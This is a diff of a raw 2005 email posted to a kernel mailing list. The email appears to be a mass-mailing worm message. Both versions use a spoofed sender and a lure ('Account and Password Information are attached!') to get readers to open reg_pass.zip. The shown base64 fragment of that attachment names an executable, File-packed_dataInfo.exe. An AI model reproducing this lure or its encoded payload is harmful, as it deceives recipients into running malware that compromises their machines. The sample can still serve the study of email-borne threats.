@@ -1,26 +1,26 @@
-From: hostmaster@radiks.net
-Subject: Registration Confirmation
-Date: Thu, 08 Dec 2005 06:55:26 GMT
-Message-ID: <a1462.8a1f3bd6204f4@radiks.net>
+From: webmaster@suite.sw.oz.au.sgi.com
+Subject: Your Password
+Date: Thu, 08 Dec 2005 10:44:32 GMT
+Message-ID: <317d.cc5ea36b60efc@suite.sw.oz.au>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="==354aac3c.a06ecccfab8"
+Content-Type: multipart/mixed; boundary="===e172c38ce6aaff1.83"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: majordomo@oss.sgi.com
+To: address@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---==354aac3c.a06ecccfab8
+--===e172c38ce6aaff1.83
 
-Protected message is attached!
+Account and Password Information are attached!
 
 
-***** Go to: http://www.radiks.net
-***** Email: postman@radiks.net
---==354aac3c.a06ecccfab8
+***** Go to: http://www.suite.sw.oz.au
+***** Email: postman@suite.sw.oz.au
+--===e172c38ce6aaff1.83
 Content-Type: application/octet-stream; name=reg_pass.zip
 Content-Transfer-Encoding: base64
 Content-Disposition: attachment; filename="reg_pass.zip"
@@ -1000,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---==354aac3c.a06ecccfab8--
+--===e172c38ce6aaff1.83--
